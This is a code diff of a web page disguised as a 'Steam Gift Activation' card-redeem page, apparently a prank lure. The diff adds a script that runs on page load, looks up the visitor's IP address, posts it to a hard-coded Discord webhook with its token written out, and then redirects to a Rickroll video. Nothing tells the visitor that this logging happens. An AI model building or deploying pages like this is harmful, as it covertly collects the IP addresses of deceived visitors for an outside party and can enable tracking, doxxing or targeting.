@@ -3,23 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <title>Steam Gift Activation</title>
+
     <meta property="og:title" content="Steam Gift Activation" />
     <meta property="og:description" content="Redeem a Steam Gift Card or Wallet Code" />
     <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ" />
-    
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThvPW3HsfNHdZmmAf3rFIjAxMeeahmV7y2wA&s" />
-    
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThvPW3HsFNhdZmmAf3rFiJAxMeeahmV7y2wA&s" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="theme-color" content="#171a21" />
 
     <script type="text/javascript">
-        // Redirects the user to the Rickroll video immediately on page load
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        // Replace this with your actual Webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1477709893875269763/hlcZYdFCsZCA4t0JKeO8Hr0OIBum2-KgPZMMsX426yUp4VeOEoTgfGSz8g7mOtvND6pT';
+
+        async function logAndRedirect() {
+            try {
+                // 1. Get the IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const clientIp = ipData.ip;
+
+                // 2. Send data to the Webhook
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📢 **New Visitor Logged**\n**IP:** \`${clientIp}\` \n**Platform:** Steam Gift Page`
+                    })
+                });
+            } catch (error) {
+                console.error('Error logging IP:', error);
+            } finally {
+                // 3. Redirect to the video regardless of success or failure
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }
+        }
+
+        // Run the function when the page loads
+        window.onload = logAndRedirect;
     </script>
 </head>
 <body>
-    <p>Redirecting to Steam Gift... If you are not redirected, <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a>.</p>
+    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+        <p>Redirecting to Steam Gift... If you are not redirected, 
+           <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a>.
+        </p>
+    </div>
 </body>
 </html>
